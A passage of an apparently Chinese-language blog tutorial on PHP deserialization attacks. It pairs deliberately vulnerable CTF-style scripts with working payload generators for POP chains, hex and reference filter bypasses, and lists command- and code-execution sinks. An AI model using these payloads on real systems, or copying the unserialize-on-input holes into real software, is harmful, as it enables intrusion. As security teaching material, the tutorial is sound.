class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">变长是通过将s:后的长度变长，导致可以将不是自己的序列化的东西也收进来</span><br><span class=\"line\">变少是通过将自己本来序列化后不是一个对象的值缩到一个对象中，那么其他缩的对象值就空了，我们就可以覆盖了</span><br><span class=\"line\"></span><br><span class=\"line\">https://www.secpulse.com/archives/165222.html</span><br></pre></td></tr></table></figure>\n<p>比如：</p>\n<h4 id=\"0x05pop-链利用\"><a class=\"markdownIt-Anchor\" href=\"#0x05pop-链利用\">#</a> 0x05POP 链利用</h4>\n<p>上面的两个例子都是基于 &quot;自动调用&quot; 的 magic function。** 但当漏洞 / 危险代码存在类的普通方法中，就不能指望通过 &quot;自动调用&quot; 来达到目的了。** 这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的 payload。</p>\n<p><strong>1. 一些有用的 POP 链中出现的方法：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- 命令执行：exec()、passthru()、popen()、system()</span><br><span class=\"line\">- 文件操作：file_put_contents()、file_get_contents()、unlink()</span><br><span class=\"line\">- 代码执行：eval()、assert()、call_user_func()   //call_user_func(assert,phpinfo());</span><br></pre></td></tr></table></figure>\n<p><strong>2. 反序列化中为了避免信息丢失，使用大写 S 支持字符串的编码。</strong></p>\n<p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示 (避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，使用如下形式即可绕过，即：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:4:&quot;user&quot;; -&gt; S:4:&quot;use\\72&quot;;</span><br></pre></td></tr></table></figure>\n<p><strong>3. 深浅 copy</strong></p>\n<p>在 php 中如果我们使用 &amp; 对变量 A 的值指向变量 B，这个时候是属于浅拷贝，当变量 B 改变时，变量 A 也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$A = &amp;$B; </span><br></pre></td></tr></table></figure>\n<p><strong>4. 利用 PHP 伪协议</strong></p>\n<p>配合 PHP 伪协议实现文件包含、命令执行等漏洞。如 glob:// 伪协议查找匹配的文件路径模式。</p>\n<h4 id=\"0x06\"><a class=\"markdownIt-Anchor\" href=\"#0x06\">#</a> 0x06</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class main &#123;</span><br><span class=\"line\">    protected $ClassObj;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct() &#123;</span><br><span class=\"line\">        $this-&gt;ClassObj = new normal();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct() &#123;</span><br><span class=\"line\">        $this-&gt;ClassObj-&gt;action();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class normal &#123;</span><br><span class=\"line\">    function action() &#123;</span><br><span class=\"line\">        echo &quot;hello bmjoker&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class evil &#123;</span><br><span class=\"line\">    private $data;</span><br><span class=\"line\">    function action() &#123;</span><br><span class=\"line\">        eval($this-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//$a = new main();</span><br><span class=\"line\">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$ClassObj</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">evil</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = <span class=\"string\">&quot;phpinfo()&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">main</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者这样构造也行</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$ClassObj</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;ClassObj = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">evil</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = <span class=\"string\">&quot;phpinfo();&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">main</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>但是由于<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>O</mi><mi>b</mi><mi>j</mi><mtext>是</mtext><mi>p</mi><mi>r</mi><mi>o</mi><mi>t</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>e</mi><mi>d</mi><mtext>类型修饰，</mtext></mrow><annotation encoding=\"application/x-tex\">ClassObj是protected类型修饰，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord cjk_fallback\">类</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">修</span><span class=\"mord cjk_fallback\">饰</span><span class=\"mord cjk_fallback\">，</span></span></span></span>data 是 private 类型修饰，在序列化的时候，多出来的字节都被 \\x00 填充，需要进行在代码中使用 urlencode 对序列化后字符串进行编码，否则无法复制解析。</p>\n<p>或者直接改不可见字符为 %00</p>\n<p>url 地址栏中会自动帮我们解析一次 url 编码</p>\n</blockquote>\n<h4 id=\"0x07\"><a class=\"markdownIt-Anchor\" href=\"#0x07\">#</a> 0x07</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyFile</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$user</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$user</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;user = <span class=\"variable\">$user</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$this</span>-&gt;name, <span class=\"string\">&quot;flag&quot;</span>)!==False) </span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;/etc/hostname&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;/etc/passwd&quot;</span>; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;user&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;user = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;user&#x27;</span>]; </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;input&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;input&#x27;</span>]; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$input</span>, <span class=\"string\">&#x27;user&#x27;</span>)!==False)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Hacker&#x27;</span>); </span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$input</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">paload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class MyFile &#123;</span><br><span class=\"line\">    public $name = &#x27;/etc/hosts&#x27;;</span><br><span class=\"line\">    public $user = &#x27;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = new MyFile();</span><br><span class=\"line\">$a-&gt;name = &amp;$a-&gt;user;</span><br><span class=\"line\">$b = serialize($a);</span><br><span class=\"line\">$b = str_replace(&quot;user&quot;, &quot;use\\\\72&quot;, $b);</span><br><span class=\"line\">$b = str_replace(&quot;s&quot;, &quot;S&quot;, $b);</span><br><span class=\"line\">var_dump($b);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//通过浅拷贝绕过 if(stristr($this-&gt;name, &quot;flag&quot;)!==False) </span><br><span class=\"line\">//通过十六进制绕过if(stristr($input, &#x27;user&#x27;)!==False)</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x08\"><a class=\"markdownIt-Anchor\" href=\"#0x08\">#</a> 0x08</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">start_gg</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Call</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test2</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funct</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$test2</span>,<span class=\"variable\">$arr</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span> = <span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">        <span class=\"variable\">$s1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">func</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod2 = <span class=\"string\">&quot;字符串拼接&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;mod1;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">string1</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;str1-&gt;<span class=\"title function_ invoke__\">get_flag</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">GetFlag</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_flag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;string&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">start_gg</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Call</span>();　　<span class=\"comment\">//把$mod1赋值为Call类对象</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test1</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Call</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1 = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">funct</span>();　　<span class=\"comment\">//把 $mod1赋值为funct类对象</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1-&gt;<span class=\"title function_ invoke__\">test2</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funct</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$mod2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;mod1= <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">func</span>();　　<span class=\"comment\">//把 $mod1赋值为func类对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$test2</span>,<span 